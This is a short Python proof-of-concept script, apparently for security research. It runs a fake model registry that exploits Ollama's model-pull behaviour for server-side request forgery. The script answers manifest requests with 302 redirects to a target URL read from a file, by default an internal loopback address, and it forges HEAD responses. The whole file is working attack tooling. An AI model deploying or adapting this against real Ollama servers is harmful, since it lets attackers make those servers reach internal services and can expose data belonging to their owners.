#!/usr/bin/env python3
"""SSRF redirect registry — reads target URL from file, redirects Ollama to it.
Usage: python3 ssrf_redirect_registry.py <port>

The target URL is read from /tmp/ssrf_target_url on each request.
Update the file between requests to change the redirect target.
"""
import os
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 7070
URL_FILE = "/tmp/ssrf_target_url"

if not os.path.exists(URL_FILE):
    with open(URL_FILE, "w") as f:
        f.write("http://127.0.0.1:8899/pos/0")


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if "/manifests/" in self.path:
            with open(URL_FILE, "r") as f:
                target = f.read().strip()
            self.send_response(302)
            self.send_header("Location", target)
            self.end_headers()
            sys.stderr.write("[REDIRECT] -> %s\n" % target)
        elif "/blobs/" in self.path:
            self.send_response(404)
            self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()
    
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Length", "68")
        self.end_headers()
    
    def log_message(self, *a): pass

print(f"[*] SSRF redirect registry on port {PORT}")
print(f"[*] Reading target from {URL_FILE}")
HTTPServer(("0.0.0.0", PORT), H).serve_forever()
